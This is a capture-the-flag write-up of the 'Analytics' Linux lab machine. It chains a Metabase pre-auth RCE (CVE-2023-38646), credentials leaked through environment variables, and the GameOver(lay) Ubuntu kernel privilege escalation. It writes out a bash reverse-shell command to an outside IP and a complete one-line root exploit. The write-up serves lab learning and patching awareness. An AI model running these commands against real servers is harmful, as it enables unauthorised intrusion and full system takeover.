#CVE #Linux #RCE #Metabase #GameOverlay #KernelExploit #SubdomainEnum

## Overview

Analytics is an easy Linux box that pairs a pre-auth RCE in a popular BI tool with a headline-grabbing kernel exploit. The foothold is **CVE-2023-38646**, an unauthenticated remote code execution in Metabase that hinges on a leaked setup token. From a shell as the `metabase` service account, environment variables hand over real user credentials, and the box finishes with **GameOver(lay)** (CVE-2023-2640 / CVE-2023-32629), an Ubuntu-specific OverlayFS flaw that turns any local user into root in a single command.

## Recon

The web root redirects to a vhost, so the first move is fixing name resolution:

```
analytical.htb -> /etc/hosts
```

The site's "Login" link then points at another subdomain:

```
http://data.analytical.htb/
```

Adding that to hosts too lands on a **Metabase** login page.

> **Why vhost enumeration matters:** a single IP can serve many sites keyed on the `Host` header. The interesting application (Metabase) wasn't on the apex domain at all, it lived on `data.` Miss the redirect and you miss the whole box.

## Foothold

### Metabase Pre-Auth RCE (CVE-2023-38646)

Metabase exposes a setup token at an unauthenticated API endpoint, and that token is the key to the exploit:

```
GET /api/session/properties   ->   "setup-token": 249fa03d-fd94-4d5b-b94f-b4ebf3df681f
```

> **How the bug works:** during first-time setup, Metabase lets you validate a database connection. The connection string accepts an H2 JDBC URL with an `INIT=` clause, which runs arbitrary SQL/Java on connect. Because the setup token is readable pre-auth, an attacker can replay the "test connection" flow long after setup and smuggle in a command, no login required.

I used [m3m0o's PoC](https://github.com/m3m0o/metabase-pre-auth-rce-poc), passing the token, target, and a bash reverse shell:

```sh
python3 main.py -u http://data.analytical.htb -t 249fa03d-fd94-4d5b-b94f-b4ebf3df681f -c "/bin/bash -i >& /dev/tcp/10.10.14.92/53 0>&1"
[+] Payload sent
```

I confirmed execution first with a curl callback to my HTTP server. `busybox nc` and a downloaded `nc` binary both failed in the container, but a bare `bash -i` reverse shell over port 53 connected as `metabase`:

```sh
rlwrap nc -lvnp 53
5ac62e96742d:/$ whoami
metabase
```

### Credentials in the Environment

This is a container, so I checked the process environment, services frequently get their secrets injected there:

```
META_USER=metalytics
META_PASS=‹redacted›
```

Those credentials worked over SSH, moving me from the container service account to a real user:

```sh
metalytics@analytics:~$ whoami
metalytics
```

## Privilege Escalation

### GameOver(lay), CVE-2023-2640 / CVE-2023-32629

Checking the kernel revealed a vulnerable Ubuntu build:

```
6.2.0-25-generic #25-22.04.2-Ubuntu
```

> **What GameOver(lay) is:** Ubuntu carried downstream patches to OverlayFS that mishandled file capabilities. By crafting an overlay mount where the upper layer copies a binary up with attacker-controlled capabilities, an unprivileged user can set `cap_setuid` on their own copy of `python3`. That capability then lets the process call `setuid(0)` and become root. It's a local privesc that needs no compiler and no credentials, just an affected kernel.

The whole escalation is one line: build the overlay, copy up `python3` with `cap_setuid`, then use it to drop to UID 0:

```sh
unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/; setcap cap_setuid+eip l/python3; mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import os;os.setuid(0);os.system("rm -rf l m u w; bash")'

root@analytics:~# whoami
root
```

## Root

Both flags read; box rooted.

## Takeaways

- **Always follow redirects and enumerate vhosts.** The vulnerable app was on a subdomain, invisible from the apex.
- **CVE-2023-38646 only needs the setup token**, which Metabase leaks pre-auth, a reminder to patch BI tooling promptly.
- **Containers leak secrets in `env`.** Service credentials there bridged from a throwaway container shell to a real SSH user.
- **GameOver(lay) is a near-universal Ubuntu privesc** for unpatched 2023-era kernels, check `uname -r` early.
